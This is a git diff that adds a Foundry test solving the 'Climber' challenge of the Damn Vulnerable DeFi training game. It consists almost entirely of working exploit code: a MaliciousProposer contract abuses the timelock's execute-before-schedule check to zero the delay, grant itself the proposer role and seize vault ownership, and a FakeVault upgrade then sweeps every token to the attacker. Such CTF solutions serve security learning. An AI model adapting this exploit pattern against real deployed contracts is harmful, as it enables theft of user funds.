@@ -86,6 +86,21 @@ contract Climber is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+
+        MaliciousProposer maliciousProposer = new MaliciousProposer(timelock, vaultProxy, dvt);
+        vm.label(address(maliciousProposer), "Malicious Proposer");
+
+        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) =
+            maliciousProposer.getPoposeData();
+
+        timelock.execute(targets, values, dataElements, salt);
+
+        console.log("Owner of the vault is now malicious proposer:", ClimberVault(address(vaultProxy)).owner());
+
+        maliciousProposer.withdraw();
+
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
@@ -100,5 +115,66 @@ contract Climber is Test {
          */
         assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
         assertEq(dvt.balanceOf(address(vaultProxy)), 0);
+    }
+}
+
+contract MaliciousProposer {
+    ClimberTimelock public timelock;
+    ERC1967Proxy public vaultProxy;
+    DamnValuableToken public dvt;
+
+    address public owner;
+
+    constructor(ClimberTimelock _timelock, ERC1967Proxy _vaultProxy, DamnValuableToken _dvt) {
+        timelock = _timelock;
+        vaultProxy = _vaultProxy;
+        dvt = _dvt;
+        owner = msg.sender;
+    }
+
+    function propose() public {
+        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) = getPoposeData();
+        timelock.schedule(targets, values, dataElements, salt);
+    }
+
+    function withdraw() public {
+        FakeVault newVaultImplementation = new FakeVault();
+
+        FakeVault proxy = FakeVault(address(vaultProxy));
+
+        proxy.upgradeTo(address(newVaultImplementation));
+        proxy.sweepFundsTo(address(dvt), owner);
+
+        dvt.transfer(owner, dvt.balanceOf(address(this)));
+    }
+
+    function getPoposeData() public view returns (address[] memory, uint256[] memory, bytes[] memory, bytes32) {
+        address[] memory targets = new address[](4);
+        targets[0] = address(timelock);
+        targets[1] = address(timelock);
+        targets[2] = address(vaultProxy);
+        targets[3] = address(this);
+
+        uint256[] memory values = new uint256[](4);
+        values[0] = 0;
+        values[1] = 0;
+        values[2] = 0;
+        values[3] = 0;
+
+        bytes[] memory dataElements = new bytes[](4);
+        dataElements[0] = abi.encodeWithSelector(timelock.updateDelay.selector, 0);
+        dataElements[1] = abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE, address(this));
+        dataElements[2] = abi.encodeWithSelector(ClimberVault(address(vaultProxy)).transferOwnership.selector, this);
+        dataElements[3] = abi.encodeWithSelector(this.propose.selector);
+
+        bytes32 salt = bytes32(0);
+
+        return (targets, values, dataElements, salt);
+    }
+}
+
+contract FakeVault is ClimberVault {
+    function sweepFundsTo(address token, address to) external onlyOwner {
+        DamnValuableToken(token).transfer(to, DamnValuableToken(token).balanceOf(address(this)));
     }
 }
